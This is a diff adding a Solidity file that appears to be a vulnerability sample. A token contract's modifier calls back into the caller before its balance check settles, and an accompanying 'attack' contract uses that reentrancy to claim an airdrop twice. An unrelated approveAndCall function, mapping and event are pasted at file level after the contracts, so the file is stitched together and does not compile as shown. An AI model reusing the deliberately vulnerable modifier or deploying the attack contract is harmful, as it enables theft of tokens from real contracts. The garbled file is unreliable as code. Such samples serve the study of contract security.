@@ -1,0 +1,61 @@
+ 
+
+pragma solidity ^0.4.24;
+
+contract ModifierEntrancy {
+  mapping (address => uint) public tokenBalance;
+  string constant name = "Nu Token";
+
+   
+   
+  function airDrop() hasNoBalance supportsToken  public{
+    tokenBalance[msg.sender] += 20;
+  }
+
+   
+  modifier supportsToken() {
+    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
+    _;
+  }
+   
+  modifier hasNoBalance {
+      require(tokenBalance[msg.sender] == 0);
+      _;
+  }
+}
+
+contract Bank{
+    function supportsToken() external pure returns(bytes32){
+        return(keccak256(abi.encodePacked("Nu Token")));
+    }
+}
+
+contract attack{  
+    bool hasBeenCalled;
+    function supportsToken() external returns(bytes32){
+        if(!hasBeenCalled){
+            hasBeenCalled = true;
+            ModifierEntrancy(msg.sender).airDrop();
+        }
+        return(keccak256(abi.encodePacked("Nu Token")));
+    }
+    function call(address token) public{
+        ModifierEntrancy(token).airDrop();
+    }
+}
+
+function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
+    allowed[msg.sender][_spender] = _value;
+    Approval(msg.sender, _spender, _value);
+
+    // call the receiveApproval function on the contract you want to be notified
+    // receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)
+    if(!_spender.call(bytes4(bytes32(sha3("receiveApproval(address,uint256,address,bytes)"))), msg.sender, _value, this, _extraData)) { 
+        throw; 
+    }
+    return true;
+}
+
+mapping (address => mapping (address => uint256)) allowed;
+
+event Approval(address indexed _owner, address indexed _spender, uint256 _value);
